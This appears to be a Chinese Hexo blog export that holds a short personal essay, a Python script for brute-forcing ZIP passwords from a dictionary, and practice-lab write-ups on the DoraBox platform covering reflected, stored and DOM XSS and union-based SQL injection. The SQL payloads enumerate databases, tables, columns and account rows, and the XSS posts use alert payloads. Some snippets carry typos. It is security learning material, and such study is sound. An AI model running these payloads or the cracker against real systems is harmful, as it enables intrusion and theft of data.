<p>当我能在脑海里想象出那样娇嫩的时候，我清楚地明白，我依然默许了躲藏，我藏着我的不甘，我藏着我的不满，我让我的忍耐不被发现，我让我的表情始终如一，生怕暴露出的锋利划伤了那样的娇嫩。以前我怕划伤别人，现在我怕划伤自己，可终究会有尽头的，我知道。</p>
<p>从今天再一次走回宿舍起，从今天我选择躲藏起，我不会是以前的我，我更不是现在的我，我也不是未来的我。我只是像一粒尘：</p>
<p>不知道下一刻自己会去哪，</p>
<p>不知道下一刻会不会遇见其他尘，</p>
<p>不知道下一刻自己是什么样，</p>
<p>没有思考，</p>
<p>独自飘着。</p>
]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title>Python实现Zip密码暴破</title>
    <url>/2019/11/11/Python%E5%AE%9E%E7%8E%B0Zip%E5%AF%86%E7%A0%81%E6%9A%B4%E7%A0%B4/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>提高自己编程能力，编写小脚本，小工具是非常重要的。</p>
<p>届时不会因为别人写的工具无法应用到当前特殊情况而苦恼，不必再去花费许久时间百度各种各样的杂乱工具下载。自己编写出适应的，特制的小工具在关键时候往往能达到事半功倍的效果。</p>
<p>这里我选择了python，今天将通过python实现Zip口令爆破</p>
<h1 id="0x01-环境准备"><a href="#0x01-环境准备" class="headerlink" title="0x01 环境准备"></a>0x01 环境准备</h1><p>python version：2.7</p>
<p>library： zipfile、threading、optparse</p>
<p>此工具通过 zipfile （zip处理库）、optparse （解析脚本标志和可选参数）、threading  （导入线程）三个库在python2.7环境下完成</p>
<a id="more"></a>

<h1 id="0x02-实现分析"><a href="#0x02-实现分析" class="headerlink" title="0x02 实现分析"></a>0x02 实现分析</h1><h4 id="Zipfile"><a href="#Zipfile" class="headerlink" title="Zipfile"></a>Zipfile</h4><p>在Zipfile模块中只使用它的zip文件解压功能</p>
<p>ZipFile.extractall(path, members, pwd)</p>
<p>解压zip文档中的所有文件到当前目录。参数members的默认值为zip文档内的所有文件名称列表，也可以自己设置选择要解压的文件名称。</p>
<p>这是一段zipfile的简单用法，它实现了最简单的zip密码测试，但是只能从源码上指定一个密码，以及预先指定的zip文件，非常简陋</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import zipfile <span class="comment">#导入库</span></span><br><span class="line"></span><br><span class="line">zFile = zipfile.ZipFile(<span class="string">'test.zip'</span>) <span class="comment">#解压Zip文件</span></span><br><span class="line"></span><br><span class="line">zFile.exctractall(<span class="built_in">pwd</span>=123)<span class="comment">#使用密码 123</span></span><br></pre></td></tr></table></figure>

<h4 id="optparse"><a href="#optparse" class="headerlink" title="optparse"></a>optparse</h4><p>optparse是一个python内置的命令解析模块，它可以用来为脚本传递命令行参数，采用预先定义好的选项来解析命令行参数。</p>
<p>add_option()用来加入选项,其中各个参数的使用：<br>dest：用于保存输入的临时变量，其值通过options的属性进行访问，存储的内容是-f或 –file之后输入的参数<br>help：用于生成帮助信息<br>default: 给dest的默认值，如果用户没有在命令行参数给dest分配值，则使用默认值<br>type: 用于检查命令行参数传入的参数的数据类型是否符合要求，有string，int，float等类型<br>action: 用于指导程序在遇到命令行参数时候该如何处理，有三种值可选： store,store_false和store_true,默认值是store<br>store：读取参数，如果参数类型符合type的要求，则将参数值传递给dest变量，作为options的一个属性供使用。<br>store_true/store_false: 一般作为一个标记使用，分别设置dest变量的值为True和False</p>
<p>下面是一个简单的add_option()使用例子，它简单实现了在命令行通过 -f 传入文件名称，-d 传入字典名称</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import optparse <span class="comment">#导入库</span></span><br><span class="line"></span><br><span class="line">parser = optparse.OptionParser()<span class="comment">#初始化，实例化一个OptionParser对象</span></span><br><span class="line">parse.add_option(<span class="string">'-f'</span>,dest=<span class="string">'filename'</span>,<span class="built_in">type</span>=<span class="string">'string'</span>,<span class="built_in">help</span>=<span class="string">'Specify a file name'</span>)<span class="comment">#指定命令行参数 -f 之后所输入的内容作为变量filename的值 类型为string </span></span><br><span class="line">perse.add_option(<span class="string">'-d'</span>,dest=<span class="string">'dictionary'</span>,<span class="built_in">type</span>=<span class="string">'string'</span>,<span class="built_in">help</span>=<span class="string">'Specify a dictionary name'</span>)<span class="comment">#指定命令行参数 -d 之后所输入的内容作为变量dictionary的值 类型为string</span></span><br><span class="line">(option.args) = parse.parse_args()</span><br></pre></td></tr></table></figure>

<p>在(option.args) = parse.parse_args()中,<br>options是通过parse.parse_args()返回的一个字典，这个字典的关键字是我们传入的dest，对应的值是我们通过命令行输入的参数后面的值，比如 -f之后所输入的文件名，字典名等，只要知道命令行参数名，如file,就可以访问其对应的值：options.file。<br>args是通过parse.parse_args()返回的一个列表，里面存放了内容</p>
<p>将通过一个例子来理解(option.args) = parse.parse_args()。在这例子中，将给 parser.parse_args() 传入参数 FakeArgs </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">FakeArgs = [<span class="string">'-f'</span>,<span class="string">'file.txt'</span>,<span class="string">'-d'</span>,<span class="string">'hello world'</span>,<span class="string">'123456'</span>,<span class="string">'password'</span>]</span><br><span class="line">options_test,args_test = parser.parse_args(FakeArgs)</span><br><span class="line"><span class="built_in">print</span> <span class="string">'options_test :'</span>+ options_test</span><br><span class="line"><span class="built_in">print</span> <span class="string">'args_test :'</span>+ args_test</span><br></pre></td></tr></table></figure>

<p>此时的输出结果为：</p>
<pre><code>options_test :  file.txt 
args_test : [&apos;hello world&apos;,&apos;123456&apos;,&apos;password&apos;]</code></pre><h4 id="Threading"><a href="#Threading" class="headerlink" title="Threading"></a>Threading</h4><p>使用Threading模块，可以提高暴力破解的性能，利用线程同时测试多个密码，而不是只能逐个测试，对字典中的每一个密码都会生成一个新线程去测试它。这里只使用了Threading模块中的Thread类</p>
<p>Thread类中的对象和描述：</p>
<p>name : 线程名（属性）</p>
<p>ident : 线程标识符（属性）</p>
<p>daemon : 线程是否是守护线程（属性）</p>
<p><em>init</em>(group=None, tatget=None, name=None, args=(),kwargs ={}, verbose=None, daemon=None) :</p>
<p>实例化一个线程对象，需要有一个可调用的 target，以及其参数 args或 kwargs。还可以传递 name 或 group 参数，不过后者还未实现。此外， verbose 标 志 也 是 可 接 受 的。 而 daemon 的 值 将 会 设定thread.daemon 属性/标志</p>
<p>start() : 开启线程</p>
<p>run() : 定义线程功能的方法（通常在子类中被应用开发者重写）</p>
<p>Barrier : 创建一个障碍，必须达到指定数量线程才开始运行</p>
<h4 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h4><p>在执行时.py文件要和要暴破的zip文件和密码字典放在同一目录下</p>
<p>这里我准备了一个乱写的字典pwd.txt,里面包含了正确的密码（密码一行写一个） 如下</p>
<img src="/2019/11/11/Python实现Zip密码暴破/timg1.PNG" title="timg">

<p>然后准备了一个加密过的zip文件zfile.zip 如下</p>
<img src="/2019/11/11/Python实现Zip密码暴破/timg2.PNG" title="timg">

<p>这是准备好的东西都在桌面上，同一目录。如下</p>
<img src="/2019/11/11/Python实现Zip密码暴破/timg3.PNG" title="timg">

<p>进入dos界面，先运行看一下Zip_Crack.py</p>
<img src="/2019/11/11/Python实现Zip密码暴破/timg4.PNG" title="timg">

<p>提示可以使用如下命令去完成操作 -f filename -d dictionary<br>这些提示是可以在optparse.OptionParser()设定的，参数就是提示，没有参数就默认没有提示。</p>
<p>接着按照操作进行zip文件暴破</p>
<img src="/2019/11/11/Python实现Zip密码暴破/timg5.PNG" title="timg">

<p>暴破成功，得到密码回显 root123，并且直接将压缩包内的文件解压到了当前目录下。</p>
<h4 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h4><p>TJ.O’Connor.Python绝技：运用python成为顶级黑客[M].崔孝晨，武晓音等译.北京：电子工业出版社，2016.1<br><a href="https://www.jianshu.com/p/b9da5fd2e5cf" target="_blank" rel="noopener">https://www.jianshu.com/p/b9da5fd2e5cf</a><br><a href="https://www.cnblogs.com/wangmo/p/7835073.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangmo/p/7835073.html</a><br><a href="https://blog.csdn.net/weixin_30709929/article/details/96264854" target="_blank" rel="noopener">https://blog.csdn.net/weixin_30709929/article/details/96264854</a></p>
<h1 id="0x03-源码"><a href="#0x03-源码" class="headerlink" title="0x03 源码"></a>0x03 源码</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import zipfile </span><br><span class="line">import optparse </span><br><span class="line">import threading  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def Crackzip(zFile,password):</span><br><span class="line">    try:</span><br><span class="line">        zFile.extractall(<span class="built_in">pwd</span>=password) </span><br><span class="line">        <span class="built_in">print</span> <span class="string">' [+] Found Password : '</span>+ password + <span class="string">'\n'</span>  </span><br><span class="line">    except:</span><br><span class="line">       pass </span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    parser = optparse.OptionParser(<span class="string">"you can use this code to Crack Zipfile"</span>+ <span class="string">'\n'</span>+<span class="string">"-f &lt;zipfile&gt;  -d &lt;dictionary&gt;"</span>)</span><br><span class="line">    parser.add_option(<span class="string">'-f'</span>,dest=<span class="string">'zname'</span>,<span class="built_in">type</span>=<span class="string">'string'</span>,<span class="built_in">help</span>=<span class="string">'specify zip file'</span>)</span><br><span class="line">    parser.add_option(<span class="string">'-d'</span>,dest=<span class="string">'dname'</span>,<span class="built_in">type</span>=<span class="string">'string'</span>,<span class="built_in">help</span>=<span class="string">'specify dictionary file'</span>)</span><br><span class="line"></span><br><span class="line">    (options,args) = parser.parse_args()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(options.zname == None ) | (options.dname == None):</span><br><span class="line">        <span class="built_in">print</span> parser.usage</span><br><span class="line">        <span class="built_in">exit</span>(0)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        zname = options.zname</span><br><span class="line">        dname = options.dname</span><br><span class="line"></span><br><span class="line">    zFile = zipfile.ZipFile(zname)</span><br><span class="line">    passFile = open(dname)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> passFile.readlines():</span><br><span class="line">        password = line.strip(<span class="string">'\n'</span>)</span><br><span class="line">        t = threading.Thread(target = Crackzip,args=(zFile,password))</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>编程</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>小工具</tag>
      </tags>
  </entry>
  <entry>
    <title>DOM型XSS靶场探究</title>
    <url>/2019/11/04/DoraBox%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0%E5%B9%B3%E5%8F%B0-XSS%EF%BC%88%E4%B8%89%EF%BC%89/</url>
    <content><![CDATA[<h1 id="DoraBox-XSS-DOM型"><a href="#DoraBox-XSS-DOM型" class="headerlink" title="DoraBox_XSS DOM型"></a>DoraBox_XSS DOM型</h1><h4 id="什么是DOM型XSS"><a href="#什么是DOM型XSS" class="headerlink" title="什么是DOM型XSS"></a>什么是DOM型XSS</h4><p>个人认为，如果将XSS分为两类，那么反射型XSS和存储型XSS是第一类，DOM型XSS是第二类。DOM型XSS区别于前两类的在于，DOM型XSS是基于<a href="https://baike.baidu.com/item/%E6%96%87%E6%A1%A3%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B/1033822?fr=aladdin&fromtitle=DOM&fromid=50288" target="_blank" rel="noopener">DOM文档对象</a>的一种漏洞，它不依赖于服务器的数据，而是从客户端获得DOM中的数据并在本地执行。</p>
<a id="more"></a>

<h4 id="构造攻击"><a href="#构造攻击" class="headerlink" title="构造攻击"></a>构造攻击</h4><p>同样的，先构造payload尝试</p>
<pre><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></pre><img src="/2019/11/04/DoraBox漏洞练习平台-XSS（三）/timg1.PNG" title="timg">

<p>成功，URL中也出现了payload，返回结果和反射型XSS是一样的，那么两者的区别体现在哪？</p>
<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>首先观察一下反射型XSS的前端源码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">		&lt;title&gt;DoraBox - 反射XSS&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">    	&lt;form action=<span class="string">""</span> method=<span class="string">"GET"</span>&gt;</span><br><span class="line">    		name: </span><br><span class="line">			&lt;input <span class="built_in">type</span>=<span class="string">"text"</span> name=<span class="string">"name"</span> id=<span class="string">"form1"</span>&gt;</span><br><span class="line">			&lt;input <span class="built_in">type</span>=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"submit"</span>&gt;</span><br><span class="line">		&lt;/form&gt;</span><br><span class="line">&lt;hr&gt; </span><br><span class="line">	&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>get方式的提交</p>
<p>在看一下DOM型XSS的源码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">		&lt;title&gt;DoraBox - DOM_XSS&lt;/title&gt;</span><br><span class="line">	&lt;/head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		&lt;form action=<span class="string">""</span> method=<span class="string">"GET"</span>&gt;</span><br><span class="line">			name: </span><br><span class="line">			&lt;input <span class="built_in">type</span>=<span class="string">"text"</span> name=<span class="string">"name"</span> id=<span class="string">"form1"</span>&gt;</span><br><span class="line">			&lt;input <span class="built_in">type</span>=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"submit"</span>&gt;</span><br><span class="line">		&lt;/form&gt;</span><br><span class="line">		&lt;hr&gt;</span><br><span class="line">		&lt;script <span class="built_in">type</span>=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">		<span class="keyword">function</span> getURLValue(name)&#123;</span><br><span class="line"> 			var reg = new RegExp(<span class="string">'(^|&amp;)'</span>+ name +<span class="string">'=([^&amp;]*)(&amp;|$)'</span>);</span><br><span class="line">			var r = window.location.search.substr(1).match(reg); </span><br><span class="line">			<span class="keyword">if</span>(r != null)&#123;</span><br><span class="line"> 				<span class="built_in">return</span> unescape(r[2]);</span><br><span class="line"> 			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		 		<span class="built_in">return</span> <span class="string">""</span>;</span><br><span class="line"> 				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		document.write(getURLValue(<span class="string">'name'</span>));</span><br><span class="line"></span><br><span class="line">	&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">//windows的location对象，查询参数，在当前页面的URL中得到？的部分 substr（）的作用是去除？，所以此处得到了name参数</span><br><span class="line"></span><br><span class="line">//unescape 方法返回一个包含 charstring 内容的字符串值。所有以 %xx 十六进制形式编码的字符都用 ASCII 字符集中等价的字符代替。</span><br><span class="line"></span><br><span class="line">//document.write()是向文本档输入指定内容，在这里document.write()输入的是name</span><br></pre></td></tr></table></figure>

<p>从DOM型XSS的前端源码中可以观察出，主要实现是通过window.location.search获取name参数，再通过document.write()在页面上返回获取到的name</p>
<p>印证了前文所述（从客户端获得DOM中的数据并在本地执行）</p>
<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>DOM型XSS同反射型XSS与存储型XSS区别于恶意代码的执行源，非传统型的XSS。</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>靶场练习</tag>
        <tag>Web渗透</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>存储型XSS靶场探究</title>
    <url>/2019/11/04/DoraBox%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0%E5%B9%B3%E5%8F%B0-XSS%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    <content><![CDATA[<h1 id="DoraBox-XSS-存储型"><a href="#DoraBox-XSS-存储型" class="headerlink" title="DoraBox_XSS 存储型"></a>DoraBox_XSS 存储型</h1><h4 id="什么是存储型XSS"><a href="#什么是存储型XSS" class="headerlink" title="什么是存储型XSS"></a>什么是存储型XSS</h4><p>我个人对存储型XSS的理解，是与反射型XSS相对的，反射型XSS只能执行一次，而存储型XSS在满足条件后，可以执行多次。</p>
<p>在 <a href="https://baike.baidu.com/item/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E5%89%96%E6%9E%90%E4%B8%8E%E9%98%B2%E5%BE%A1/12350206?fr=aladdin" target="_blank" rel="noopener">《XSS跨站脚本攻击剖析与防御》</a>一书中对存储型XSS是这样定义的：</p>
<p>持久型跨站脚本（Presistent Cross-site Scripting）也等于<a href="https://blog.csdn.net/weixin_44720762/article/details/89736508" target="_blank" rel="noopener">存储型跨站脚本（Stored Cross-site Scripting）</a>，比反射型跨站脚本更具有威胁性，并且可能影响到Web服务器的安全。持久型XSS一般出现在网站的留言、评论、博客日志等交互处，恶意脚本被存储到客户端或服务器的数据库中，当其他用户浏览该网页时，站点即从数据库中读取恶意用户存入的非法数据，然后显示在网页中，即在受害者主机上的浏览器执行恶意代码。</p>
<a id="more"></a>

<h4 id="构造攻击"><a href="#构造攻击" class="headerlink" title="构造攻击"></a>构造攻击</h4><p>同之前一样，我们先构造一个XSS的payload的提交上去</p>
<pre><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></pre><img src="/2019/11/04/DoraBox漏洞练习平台-XSS（二）/timg1.PNG" title="timg">

<p>触发弹窗，payload执行成功，观察URL这次没有name参数了。</p>
<p>但是当我们点击确定的时候，弹窗重新出现。尝试刷新，弹窗依旧没有消失。而这，就是存可以执行多次的储型XSS，它将payload存储在了页面中，导致每次打开页面时都会执行一次payload。</p>
<img src="/2019/11/04/DoraBox漏洞练习平台-XSS（二）/timg1.PNG" title="timg">

<p>我们观察一下前端源码可以发现，每次执行的payload都保留在了网页中</p>
<img src="/2019/11/04/DoraBox漏洞练习平台-XSS（二）/timg2.PNG" title="timg">

<p>不难发现这就是存储型XSS的特点，将恶意代码长时间留存，每次打开网页都会造成一次攻击，威力远超一次性的反射型XSS</p>
<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>本次漏洞实践，充分表现了反射型XSS和存储型XSS的区别，更加深刻的了解了XSS</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>靶场练习</tag>
        <tag>Web渗透</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>反射型XSS靶场探究</title>
    <url>/2019/11/04/DoraBox%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0%E5%B9%B3%E5%8F%B0-XSS%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<h1 id="DoraBox-XSS-反射型"><a href="#DoraBox-XSS-反射型" class="headerlink" title="DoraBox_XSS 反射型"></a>DoraBox_XSS 反射型</h1><h4 id="什么是反射型XSS"><a href="#什么是反射型XSS" class="headerlink" title="什么是反射型XSS"></a>什么是反射型XSS</h4><p>作为DoraBox第一次的XSS漏洞练习，先看一下什么是XSS：</p>
<p><a href="https://baike.baidu.com/item/XSS%E6%94%BB%E5%87%BB/954065?fr=aladdin" target="_blank" rel="noopener">XSS(Cross-site Scripting)</a>通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序(来源百度百科)</p>
<p>我所理解的反射型XSS是XSS的一种， 是一次性的XSS。在满足条件时，只能触发一次，下一次就无法再触发，除非重新部署。</p>
<p>在 <a href="https://baike.baidu.com/item/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E5%89%96%E6%9E%90%E4%B8%8E%E9%98%B2%E5%BE%A1/12350206?fr=aladdin" target="_blank" rel="noopener">《XSS跨站脚本攻击剖析与防御》</a>一书中对反射型XSS是这样定义的：</p>
<p><a href="http://www.ttlsa.com/safe/xss-description/" target="_blank" rel="noopener">反射型跨站脚本（Reflected Cross-site Scripting）</a>也称非持久型，参数型跨站脚本。这类跨站脚本是做常见的，主要是将恶意脚本附加到URL地址参数中。反射型XSS的利用一般是攻击者通过特殊的手法（比如利用电子邮件），诱使用户点击这些特定链接时，恶意的JavaScript代码会直接在受害者主机上执行。他的特点是指在用户点击时触发，而且只执行一次，非持久化，所以称为反射型跨站脚本。</p>
<a id="more"></a>

<h4 id="观察环境"><a href="#观察环境" class="headerlink" title="观察环境"></a>观察环境</h4><p>进入XSS环境，根据先前对反射型XSS的描述（将恶意脚本附加到URL地址参数），这提醒我们可以先观察URL是否满足条件。</p>
<img src="/2019/11/04/DoraBox漏洞练习平台-XSS（一）/timg2.PNG" title="timg">

<p>可以看见，红色箭头指向的地方，在URL中出现了submit提交的name参数(红色箭头指向)</p>
<h4 id="构造攻击"><a href="#构造攻击" class="headerlink" title="构造攻击"></a>构造攻击</h4><p>构造payload提交 ，此payload的效果是弹窗</p>
<pre><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></pre><img src="/2019/11/04/DoraBox漏洞练习平台-XSS（一）/timg1.PNG" title="timg">

<p>执行成功，同时可以看见URL中 name参数 变成了我们的payload。当我们对弹框点击确定后，XSS消失。观察前端源码可以发现我们的payload</p>
<img src="/2019/11/04/DoraBox漏洞练习平台-XSS（一）/timg4.PNG" title="timg">

<p>不难理解，反射型XSS就是通过提交恶意代码让浏览器执行一次，从而达到我们需要的目的。</p>
<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>在2019年OWASP Top10中，XSS位列第三，可见XSS在Web安全漏洞中的重要地位。</p>
<p>小插曲：我被自己XSS了！</p>
<p>前文写到的payload，因为要在本地localhost刷新，看完最终效果后我才会上传文章<br>，就在刚才写完准备检查一遍的时候，我惊了。</p>
<img src="/2019/11/04/DoraBox漏洞练习平台-XSS（一）/timg3.PNG" title="timg">









]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>靶场练习</tag>
        <tag>Web渗透</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>搜索型_SQL注入（三）</title>
    <url>/2019/11/04/DoraBox%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0%E5%B9%B3%E5%8F%B0-SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%89%EF%BC%89/</url>
    <content><![CDATA[<h1 id="DoraBox-SQLi搜索型"><a href="#DoraBox-SQLi搜索型" class="headerlink" title="DoraBox_SQLi搜索型"></a>DoraBox_SQLi搜索型</h1><h4 id="进入页面，先submit看一下SQL语句"><a href="#进入页面，先submit看一下SQL语句" class="headerlink" title="进入页面，先submit看一下SQL语句"></a>进入页面，先submit看一下SQL语句</h4><img src="/2019/11/04/DoraBox漏洞练习平台-SQL注入（三）/timg1.PNG" title="timg">

<p>可以发现，需要闭合 % 和 ‘</p>
<a id="more"></a>

<h4 id="构造闭合和显示位"><a href="#构造闭合和显示位" class="headerlink" title="构造闭合和显示位"></a>构造闭合和显示位</h4><p>DoraBox%’ and 1=2 union select 1,2,3#</p>
<img src="/2019/11/04/DoraBox漏洞练习平台-SQL注入（三）/timg2.PNG" title="timg">

<h4 id="爆库名"><a href="#爆库名" class="headerlink" title="爆库名"></a>爆库名</h4><p>DoraBox%’ and 1=2 union select 1,2,database()#</p>
<img src="/2019/11/04/DoraBox漏洞练习平台-SQL注入（三）/timg3.PNG" title="timg">

<h4 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h4><p>DoraBox%’ and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#</p>
<img src="/2019/11/04/DoraBox漏洞练习平台-SQL注入（三）/timg4.PNG" title="timg">

<h4 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h4><p>DoraBox%’ and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’account’#</p>
<img src="/2019/11/04/DoraBox漏洞练习平台-SQL注入（三）/timg5.PNG" title="timg">

<h4 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h4><p>DoraBox%’ and 1=2 union select 1,2,concat_ws(‘/‘,id,rest,own) from account#</p>
<img src="/2019/11/04/DoraBox漏洞练习平台-SQL注入（三）/timg7.PNG" title="timg">

<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>自此DoraBox的SQL注入部分全部完成，都是基础操作</p>
<p>SQLi数字型不用闭合，需要传入ID</p>
<p>SQLi字符型需要闭合 ‘</p>
<p>SQLi搜索型需要闭合 % 和 ‘</p>
<p>可见，在进行SQL注入时，要通过错误返回发现SQL执行语句或者大胆猜测SQL执行语句，才能构造完美闭合，达到最终目的。</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>靶场练习</tag>
        <tag>Web渗透</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>字符型_SQL注入（二）</title>
    <url>/2019/11/03/DoraBox%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0%E5%B9%B3%E5%8F%B0-SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    <content><![CDATA[<h1 id="DoraBox-SQLi字符型"><a href="#DoraBox-SQLi字符型" class="headerlink" title="DoraBox_SQLi字符型"></a>DoraBox_SQLi字符型</h1><h4 id="进入页面，先submit看一下"><a href="#进入页面，先submit看一下" class="headerlink" title="进入页面，先submit看一下"></a>进入页面，先submit看一下</h4><img src="/2019/11/03/DoraBox漏洞练习平台-SQL注入（二）/timg1.PNG" title="timg">

<p>这里可以看见SQL语句：SELECT * FROM news WHERE title=’DoraBox’</p>
<a id="more"></a>

<p>猜测需要闭合单引号。用 and 1=1 验证</p>
<img src="/2019/11/03/DoraBox漏洞练习平台-SQL注入（二）/timg2.PNG" title="timg">

<p>猜测正确，可以继续。</p>
<p>之后大致过程与数字型一样，只要注意最后单引号的闭合即可，或者可以用#注释</p>
<h4 id="爆库名，用户"><a href="#爆库名，用户" class="headerlink" title="爆库名，用户"></a>爆库名，用户</h4><p>DoraBox’ and ‘1’ =’2’ union select 1,database(),user()#</p>
<img src="/2019/11/03/DoraBox漏洞练习平台-SQL注入（二）/timg3.PNG" title="timg">

<h4 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h4><p>DoraBox’ and ‘1’ =’2’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’pentest’#</p>
<img src="/2019/11/03/DoraBox漏洞练习平台-SQL注入（二）/timg4.PNG" title="timg">

<h4 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h4><p>DoraBox’ and ‘1’ =’2’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’account’#</p>
<img src="/2019/11/03/DoraBox漏洞练习平台-SQL注入（二）/timg5.PNG" title="timg">

<h4 id="爆内容"><a href="#爆内容" class="headerlink" title="爆内容"></a>爆内容</h4><p>DoraBox’ and ‘1’ =’2’ union select 1,2,concat_ws(‘/‘,id,rest,own) from account #</p>
<img src="/2019/11/03/DoraBox漏洞练习平台-SQL注入（二）/timg6.PNG" title="timg">

<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>同数字型方式大致相同，注意单引号闭合即可</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>靶场练习</tag>
        <tag>Web渗透</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>数字型_SQL注入（一）</title>
    <url>/2019/11/02/DoraBox%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0%E5%B9%B3%E5%8F%B0_SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<h1 id="DoraBox-SQLi数字型"><a href="#DoraBox-SQLi数字型" class="headerlink" title="DoraBox_SQLi数字型"></a>DoraBox_SQLi数字型</h1><h4 id="进入SQLi数字型的注入页面"><a href="#进入SQLi数字型的注入页面" class="headerlink" title="进入SQLi数字型的注入页面"></a>进入SQLi数字型的注入页面</h4><img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg1.PNG" title="timg">

<p>很简单的页面</p>
<a id="more"></a>

<h4 id="初步判断"><a href="#初步判断" class="headerlink" title="初步判断"></a>初步判断</h4><p>先点击submit看结果，这里显示出了SQL执行语句 如下</p>
<img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg2.PNG" title="timg">

<p>好接下来 传入id 并观察页面返回 页面返回正常 如下</p>
<p>1 and 1=1</p>
<img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg3.PNG" title="timg">

<p>接着观察，页面返回出错 如下</p>
<p>1 and 1=2</p>
<img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg4.PNG" title="timg">

